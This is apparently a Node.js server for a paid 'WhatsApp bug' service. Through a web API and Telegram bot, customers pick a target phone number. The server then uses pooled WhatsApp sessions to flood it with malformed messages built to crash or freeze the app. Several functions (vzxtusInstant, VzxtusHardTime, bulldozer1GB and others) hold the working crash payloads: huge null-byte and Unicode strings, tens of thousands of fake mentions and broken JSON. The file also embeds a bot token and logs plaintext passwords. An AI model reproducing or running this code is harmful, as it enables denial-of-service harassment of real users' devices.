const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
    //console.log('Unhandled Rejection:', reason);
});

process.on('uncaughtException', (err) => {
    //console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const allowedGroupId = -1002418218579;
const PORT = 2001;

async function vzxtusInstant(sock, targetJid) {
  try {
  for (let i = 0; i < 111; i++) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [targetJid],
              isForwarded: false,
              forwardingScore: 0,
              businessMessageForwardInfo: {
                businessOwnerJid: targetJid,
              },
            },
            body: {
              text: "ꦾ".repeat(90000)
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "{}{{{{{{}}{{{{{{{{}{{{{{{}{{{{{{}{}{}{}{{{{{{{{{{{{{{{}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{}{}{}{}{}{}{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{{",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{ \"status\": true ",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(100000),
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(targetJid, message, {
      participant: { jid: targetJid },
    });
    }
  } catch (err) {
    console.log(err);
  }
}

async function notrespondingbug(sock, targetJid) {
  const mentionedList = [
    "696969696969@s.whatsapp.net",
    ...Array.from({ length: 35000 }, () =>
      `92${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  for (let i = 0; i < 111; i++) {
    const MSG = await generateWAMessageFromContent(targetJid, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32)
          },
          interactiveResponseMessage: {
            body: {
              text: "ꦽ".repeat(44444),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(8077708),
              version: 3
            },
            contextInfo: {
              ephemeralExpiration: 0,
              forwardingScore: 0,
              isForwarded: false,
              participant: targetJid,
              stanzaId: `PnX-Id${Math.floor(Math.random() * 99999)}`,
              conversionSource: "facebook_ads",
              conversionData: "{\"fb_campaign_id\":\"9999\",\"fb_ad_id\":\"9999\"}",
              conversionDelayMs: "9999",
              groupInviteMessage: {
                inviteCode: "Xx".repeat(10000),
                groupJid: "1@g.us",
                groupName: "\u0000".repeat(10000),
                inviteExpiration: 99999999999,
                caption: ""
              },
              mentionedJid: mentionedList,
              font: Math.floor(Math.random() * 9),
              background: `#${Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")}`,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "Sent",
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(8077708),
                        version: 3
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    });

    await sock.relayMessage("status@broadcast", MSG.message, {
      messageId: MSG.key.id,
      statusJidList: [targetJid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: targetJid },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });
  }
}

async function VzxtusHardTime(sock, targetJid) {
  let CursorAPI = JSON.stringify({
    status: true,
    criador: "🩸",
    resultado: {
      type: "md",
      ws: {
        _events: { "CB:ib,,dirty": ["Array"] },
        _eventsCount: 8000000,
        _maxListeners: 1,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["@latest"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: true,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  const mentionedList = [
    "696969696969@s.whatsapp.net",
    ...Array.from({ length: 35000 }, () =>
      `92${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  let cards = [];

  for (let i = 0; i < 1000; i++) {
    cards.push({
      header: {
        title: "ꦾ".repeat(5000),
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
          fileLength: 107374182.4,
          height: 999,
          width: 999,
          mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
          fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
          directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1749172037",
          jpegThumbnail: "PhynxAgency",
          scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
          scanLengths: [8596, 155493]
        },
        hasMediaAttachment: true
      },
      body: {
        text: "ꦾ".repeat(60000)
      },
      footer: {
        text: "ꦾ".repeat(60000)
      },
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: CursorAPI
          },
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              status: true,
              criador: "🩸",
              resultado: "{".repeat(10000)
            })
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "⎋ xɴxx.ᴄᴏᴍ -‣",
              url: `https://xxx.app/${"ꦾ".repeat(99999)}`,
              merchant_url: `https://xxx.app/${"ꦾ".repeat(99999)}`
            })
          },
          {
            name: "review_and_pay",
            buttonParamsJson: CursorAPI
          },
          {
            name: "galaxy_message",
            buttonParamsJson: CursorAPI
          },
          {
            name: "call_permission_request",
            buttonParamsJson: CursorAPI
          },
          {
            name: "call_permission_request",
            buttonParamsJson: JSON.stringify({
              status: true,
              criador: "🩸",
              resultado: "{".repeat(10000)
            })
          },
          {
            name: "cta_call",
            buttonParamsJson: JSON.stringify({
              status: "0"
            })
          }
        ]
      }
    });
  }

  const msg = await generateWAMessageFromContent(targetJid, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
            })
          },
        interactiveMessage: {
          body: {
            text: ''
          },
          footer: {
            text: ''
          },
          carouselMessage: {
            cards: []
          },
          contextInfo: {
            participant: targetJid,
            stanzaId: "PnX" + "-Id" + Math.floor(Math.random() * 99999),
            mentionedJid: mentionedList,
            conversionSource: "facebook_ads",
            conversionData: "{\"fb_campaign_id\":\"9999\",\"fb_ad_id\":\"9999\"}",
            conversionDelayMs: "9999",
            groupInviteMessage: {
              inviteCode: "Xx".repeat(10000),
              groupJid: "1@g.us",
              groupName: "\u0000".repeat(10000),
              inviteExpiration: 99999999999,
              caption: ""
            },
            externalAdReply: {
              title: "\u0000".repeat(15000),
              body: " who i am ~ @raldzzxyz_ ",
              thumbnailUrl: "about:blank",
              mediaType: 1,
              sourceUrl: `https://xnxx.com/${"ꦾ".repeat(99999)}`,
              showAdAttribution: false
            },
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(999999),
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: targetJid
          }
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetJid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: targetJid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}

async function bulldozer1GB(sock, targetJid) {
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: targetJid,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1000 * 40 },
                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 1000,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(targetJid, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [targetJid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: targetJid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}


app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

// ===== Debug Logger Middleware =====
app.use((req, res, next) => {
  const time = new Date().toISOString();
  console.log(`\n[${time}] ${req.method} ${req.originalUrl}`);
  if (req.method === "POST") {
    console.log("↪️  POST Body:", req.body);
  } else if (req.method === "GET") {
    console.log("↪️  GET Query:", req.query);
  }
  const userAgent = req.headers['user-agent'] || '';

  // Hanya izinkan User-Agent default dari Flutter
  const allowedPattern = /^Dart\/[\d.]+ \(dart:io\)$/;

      const ip =
    req.headers['x-forwarded-for']?.split(',')[0] || // if behind proxy
    req.connection.remoteAddress ||
    req.socket.remoteAddress;

  console.log(`[🌐 IP] Request dari: ${ip}`);

  if (!allowedPattern.test(userAgent)) {
    console.warn(`[🚫 BLOCKED UA] Request ditolak dari User-Agent: '${userAgent}'`);
    return res.status(403).json({
      valid: false,
      blocked: true,
      message: "Bad Request."
    });
  }

  next();
});

const DB_PATH = "./database.json";
let activeKeys = {};

const bugs = [
  { bug_id: "force_buss", bug_name: "Force Close ( Bussines )" },
  { bug_id: "force_ori", bug_name: "Force Close ( Original )" },
  { bug_id: "force_ios", bug_name: "Force Close ( IOS )" },
    { bug_id: "hard_delay", bug_name: "UngisibleX Hard Delay ( Hard DixCusiion )" },
  { bug_id: "xoro_bug", bug_name: "SouckedX ( Quota Sucked/Invisible )" },
    { bug_id: "not_responding", bug_name: "Not Responding ( Bug Ethical Chat )" },
];

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  console.log("[🗃️ DB] Database dimuat:", data);
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
  console.log("[💾 DB] Database disimpan:", data);
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

// ===== Endpoint: Login & Key Fetch =====
app.post("/validate", (req, res) => {
  const { username, password } = req.body;
  console.log("[🔐 LOGIN] Login attempt:", username, password);
  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) {
    console.log("[❌ LOGIN] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ LOGIN] User expired.");
    return res.json({ valid: true, expired: true });
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  console.log("[✅ LOGIN] Key diberikan:", key);

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
  });
});

// ===== Endpoint: Get My Info =====
app.get("/myInfo", (req, res) => {
  const { username, password } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);
  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs
  });
});

// ===== Endpoint: Send Bug =====
app.get("/sendBug", async (req, res) => {
  const { key, target, bug } = req.query;
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  const roleCooldowns = {
    member: 120,
    reseller: 60,
    owner: 1,
    vip: 1,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 120;

  if (!keyInfo.lastSend) keyInfo.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - keyInfo.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon duluan ============
  keyInfo.lastSend = now;
  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

// ============ Kirim bug di background ============
setImmediate(async () => {
  const isMessBug = bug === "crash_invis";

  const getSock = (isMessOnly = false) => {
    const pool = isMessOnly ? mess : activeConnections;
    const keys = Object.keys(pool);
    if (!keys.length) return null;
    const randKey = keys[Math.floor(Math.random() * keys.length)];
    return pool[randKey];
  };

  const attemptSend = async (sock, retry = false) => {
    try {
      const targetJid = target + "@s.whatsapp.net";

      switch (bug) {
  case "hard_delay":
    for (let i = 0; i < 250; i++) {
      await bulldozer1GB(sock, targetJid);
      await bulldozer1GB(sock, targetJid);
      console.log(`[🔁 ${i + 1}/250] hard delay terkirim ke ${targetJid}`);
    }
    break;

  case "force_ori":
    for (let i = 0; i < 50; i++) {
      await vzxtusInstant(sock, targetJid);
      console.log(`[🔁 ${i + 1}/10] force_ori terkirim ke ${targetJid}`);
    }
    break;

  case "force_buss":
    for (let i = 0; i < 50; i++) {
      await vzxtusInstant(sock, targetJid);
      console.log(`[🔁 ${i + 1}/50] force_buss terkirim ke ${targetJid}`);
    }
    break;

  case "force_ios":
    for (let i = 0; i < 50; i++) {
      await vzxtusInstant(sock, targetJid);
      console.log(`[🔁 ${i + 1}/50] force_ios terkirim ke ${targetJid}`);
    }
    break;

  case "xoro_bug":
    for (let i = 0; i < 250; i++) {
      await bulldozer1GB(sock, targetJid);
      await bulldozer1GB(sock, targetJid);
      console.log(`[🔁 ${i + 1}/250] crash_invis quota terkirim ke ${targetJid}`);
    }
    break;

  case "not_responding":
    for (let i = 0; i < 200; i++) {
      await bulldozer1GB(sock, targetJid);
      await bulldozer1GB(sock, targetJid);
      console.log(`[🔁 ${i + 1}/200] notresponding terkirim ke ${targetJid}`);
    }
    break;
}

      console.log(`[✅ BUG] Bug '${bug}' selesai dikirim ke ${targetJid}`);
      return true;
    } catch (err) {
      console.warn(`[⚠️ SEND ERROR] ${err.message}`);
      const sessionName = Object.keys(activeConnections).find(k => activeConnections[k] === sock);
      if (sessionName) {
        delete activeConnections[sessionName];
        delete mess[sessionName];
        delete biz[sessionName];
      }
      if (!retry) {
        const retrySock = getSock(isMessBug);
        if (retrySock) return await attemptSend(retrySock, true);
      }
      console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${targetJid}`);
      return false;
    }
  };

  const sock = getSock(isMessBug);
  if (!sock) {
    console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
    return;
  }

  await attemptSend(sock);
});
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  console.log("[✅ LIST] Daftar user berhasil diambil:", users);
  return res.json({ valid: true, authorized: true, users });
});

//====================== //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}
async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const { state } = await useMultiFileAuthState(folderPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        browser: ["MultiSession", "Chrome", "1.0.0"],
        logger: P({ level: "silent" }),
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${folderPath}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          //console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            console.log(`\n[${sessionName}] Session crash, removing.`);
            //fs.unlinkSync(`permenmd/${sessionName}.json`);
            //fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve();
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            //fs.unlinkSync(`permenmd/${sessionName}.json`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            delete biz[sessionName];
            delete mess[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}
async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function refreshUserSessions() {
  await disconnectAllActiveConnections();
  await startUserSessions();
}
async function pairingWa(men, chatId, number, attempt = 1) {
  const sessionDir = path.join('permenmd', number); // simpan di permenmd/number

  if (attempt > 5) {
    console.log(`⚠️ ${number} reached max reconnect attempts (5). Stopping.`);
    fs.rm(sessionDir, { recursive: true, force: true }, (err) => {
      if (err) console.error('Error deleting directory:', err);
      else console.log('Directory deleted successfully');
    });
    return;
  }

  // Pastikan folder permenmd dan session-nya ada
  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"]
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}... Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(men, chatId, number, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      await men.sendMessage(chatId, `✅ ${number} connected and stored!`);
      saveNumberToDataset(number);

      // Setelah connect, copy creds.json ke permenmd/number.json
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', `${number}.json`);

      try {
        if (fs.existsSync(sourceCreds)) {
          fs.copyFileSync(sourceCreds, destCreds);
          console.log(`✅ Saved session as ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to copy creds: ${e.message}`);
      }
    }
  });

  if (!sock.authState.creds.registered) {
    try {
      await waiting(1000);
      let code = await sock.requestPairingCode(number);
      await men.sendMessage(chatId, `⌛ Pairing Code: ${code}`);
    } catch (err) {
      await men.sendMessage(chatId, `❌ Error during pairing: ${err}`);
    }
  }
}
async function startUserSessions() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;
  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);


  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

const TOKEN = "8079875820:AAF2qwtCgDXnvKVf7g6b3COOw6bimVbCvuY"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });
const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

function getRoleByTelegramId(id) {
  const config = loadTelegramConfig();
  const db = loadDatabase();
  if (config.ownerList.includes(id)) return 'owner';
